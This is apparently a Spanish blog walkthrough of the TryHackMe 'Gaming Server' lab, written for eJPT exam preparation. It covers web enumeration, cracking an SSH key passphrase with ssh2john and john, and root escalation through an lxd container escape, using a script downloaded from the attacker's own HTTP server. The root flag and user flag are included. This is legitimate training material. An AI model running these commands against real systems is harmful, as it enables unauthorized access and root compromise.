---
title: "Gaming Server"
date: 2026-02-25
draft: false
description: "Walkthrough de Gaming Server de TryHackMe. Llave SSH con passphrase crackeada con John, acceso como john y escalada de privilegios via grupo lxd — preparación eJPT."
tags:
  [
    "walkthrough",
    "tryhackme",
    "ejpt",
    "linux",
    "ssh",
    "john",
    "lxd",
    "privesc",
    "web",
    "container-escape",
  ]
categories: ["Walkthroughs"]
series: ["Road to eJPTv2"]
ShowToc: true
TocOpen: false
weight: 14
---

## Resumen

**Gaming Server** es la decimocuarta máquina de la serie _Road to eJPTv2_. Una máquina de superficie reducida — solo SSH y HTTP — donde la enumeración web revela una llave SSH protegida con passphrase y un usuario en el código fuente. La escalada de privilegios introduce una técnica menos común pero muy relevante: escape de contenedor **LXD** para acceder al sistema de archivos del host como root.

| Atributo       | Valor                                                              |
| -------------- | ------------------------------------------------------------------ |
| **Plataforma** | TryHackMe                                                          |
| **Dificultad** | Fácil                                                              |
| **OS**         | Linux (Ubuntu)                                                     |
| **Sala**       | [Gaming Server](https://tryhackme.com/room/gamingserver)           |
| **Skills**     | Web Enum, SSH Key Cracking, LXD Privilege Escalation               |

### Herramientas usadas

- `nmap` — escaneo de puertos y versiones
- `whatweb` — fingerprinting web
- `gobuster` — fuzzing de directorios web
- `ssh2john` — conversión de llave SSH a hash
- `john` — crackeo del hash de la passphrase
- `ssh` — acceso con llave privada
- `lxd` / `LxD.sh` — escape de contenedor para privesc

### Resumen de la solución

1. **Reconocimiento:** nmap detecta solo SSH y HTTP. El sitio se llama "House of danak".
2. **Fuzzing web:** gobuster encuentra `/uploads` (con un diccionario) y `/secret` (con una llave `id_rsa`).
3. **Código fuente:** El HTML revela el usuario `john`.
4. **Crackeo de passphrase:** La llave SSH está protegida. `ssh2john` + `john` la descifra: `letmein`.
5. **Acceso SSH:** Conectamos como `john` usando la llave y la passphrase.
6. **User flag:** Encontrada en `/home/john/user.txt`.
7. **Privesc:** `john` pertenece al grupo `lxd`. Usamos un script de escape de contenedor con una imagen Alpine para montar el sistema de archivos del host y leer la root flag.

---

## Reconocimiento

### Ping

Verificamos conectividad e identificamos el SO por el TTL:

```bash
ping -c 1 10.67.172.94
```

```
64 bytes from 10.67.172.94: icmp_seq=1 ttl=62 time=71.0 ms
```

TTL 62 → Linux (el valor original es 64, se decrementó en los saltos de red).

### Nmap — Escaneo de puertos

```bash
nmap 10.67.172.94 -n -Pn -sS -p- --open --min-rate=5000 -oG AllTCPports
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Solo dos puertos — toda la enumeración inicial será web.

### Nmap — Versiones y scripts

```bash
nmap 10.67.172.94 -n -Pn -sS -p22,80 -sVC --min-rate=5000 -oN gamingscan.txt
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: House of danak
```

El título del sitio es **House of danak** — un sitio de temática de juegos.

### Whatweb

```bash
whatweb http://10.67.172.94
```

```
http://10.67.172.94 [200 OK] Apache[2.4.29], Title[House of danak]
```

### Fuzzing web — gobuster

```bash
gobuster dir -u http://10.67.172.94 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x html,bak,css,xml,.ssh
```

```
/index.html   (Status: 200)
/about.html   (Status: 200)
/uploads      (Status: 301)
/style.css    (Status: 200)
/secret       (Status: 301)
/myths.html   (Status: 200)
```

Dos hallazgos clave:
- `/uploads` — contiene un diccionario de palabras descargable
- `/secret` — contiene una llave `id_rsa`

### Código fuente — Usuario john

Inspeccionando el código fuente del sitio encontramos un comentario HTML con el nombre de usuario:

```html
<!-- john, please add some content to the site -->
```

> **Usuario encontrado:** `john`

---

## Explotación

### Descarga de la llave SSH

Descargamos la llave privada desde `/secret/`:

```bash
wget http://10.67.172.94/secret/id_rsa
chmod 600 id_rsa
```

Al intentar conectar por SSH, la llave solicita una passphrase — no es de acceso directo:

```bash
ssh -i id_rsa john@10.67.172.94
Enter passphrase for key 'id_rsa':
```

### Crackeo de passphrase — ssh2john + john

Convertimos la llave a un formato que John the Ripper pueda procesar:

```bash
ssh2john id_rsa > idrsagaming.hash
```

Lanzamos el ataque con rockyou.txt:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt idrsagaming.hash
```

```
letmein          (id_rsa)
1g 0:00:00:00 DONE (2026-02-25 21:15)
```

> **Passphrase de la llave:** `letmein`

### Acceso SSH como john

```bash
ssh -i id_rsa john@10.67.172.94
Enter passphrase for key 'id_rsa': letmein
```

```
john@exploitable:~$
```

---

## Post-Explotación

### User flag

```bash
john@exploitable:~$ cat user.txt
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```

> **User flag:** `a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e`

### Enumeración — grupo lxd

```bash
john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

`john` pertenece al grupo `lxd` — esto permite crear y gestionar contenedores LXD con acceso al dispositivo del host.

---

## Escalada de privilegios

### LXD Container Escape

LXD es el gestor de contenedores de Ubuntu. Un usuario en el grupo `lxd` puede crear contenedores con el disco del host montado, lo que efectivamente da acceso root al sistema de archivos completo desde dentro del contenedor.

**Paso 1:** En `/tmp` ya existe una imagen Alpine precompilada. Transferimos el script de explotación desde nuestra máquina:

```bash
# Máquina atacante
python3 -m http.server 80

# Máquina víctima
cd /tmp
wget http://192.168.136.70/LxD.sh
chmod +x LxD.sh
```

**Paso 2:** Ejecutamos el script con la imagen Alpine:

```bash
john@exploitable:/tmp$ ./LxD.sh -f alpine-v3.13-x86_64-20210218_0139.tar.gz
```

```
Image imported with fingerprint: cd73881adaac...
Creating privesc
Device giveMeRoot added to privesc
~ # whoami
root
```

El script importa la imagen Alpine, crea un contenedor con el disco del host montado en `/mnt/root`, y abre una shell como root dentro del contenedor.

**Paso 3:** Accedemos al sistema de archivos del host desde el contenedor:

```bash
~ # cd /mnt/root/root/
/mnt/root/root # cat root.txt
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
```

> **Root flag:** `2e337b8c9f3aff0c2b3e8d4e6a7c88fc`

---

## Lecciones aprendidas

- **Los directorios web con nombres genéricos esconden cosas importantes** — `/secret` y `/uploads` son nombres que siempre merecen revisión. El fuzzing exhaustivo es indispensable.
- **Una llave SSH con passphrase no es un callejón sin salida** — `ssh2john` convierte la llave a un hash crackeable. Las llaves con passphrases débiles son tan vulnerables como las contraseñas débiles.
- **`id` es uno de los primeros comandos en post-explotación** — Grupos como `lxd`, `docker`, `disk` o `sudo` son vectores de escalada inmediata. Siempre verificar la membresía de grupos.
- **LXD/Docker en el grupo de un usuario sin privilegios = root efectivo** — Cualquier usuario en el grupo `lxd` o `docker` puede escalar a root montando el sistema de archivos del host. Es una misconfiguration crítica.
- **Los contenedores no son un límite de seguridad si el usuario los controla** — El aislamiento de contenedores solo funciona cuando el usuario no tiene permisos de gestión sobre ellos.

### Para la eJPT

| Concepto                         | Relevancia eJPT                                         |
| -------------------------------- | ------------------------------------------------------- |
| Enumeración web exhaustiva       | Directorios ocultos son vectores frecuentes en el examen |
| Crackeo de passphrase SSH        | Técnica de acceso con credenciales protegidas           |
| Análisis de grupos del usuario   | Enumeración post-explotación estándar                   |
| LXD/Docker group privesc         | Privesc por misconfiguration sin exploit de kernel      |

**Tiempo aproximado de resolución:** 30-45 minutos.

---

## Referencias

- [Gaming Server — TryHackMe](https://tryhackme.com/room/gamingserver)
- [LXD Privilege Escalation — HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)
- [GTFOBins](https://gtfobins.github.io/)
- [ssh2john](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py)
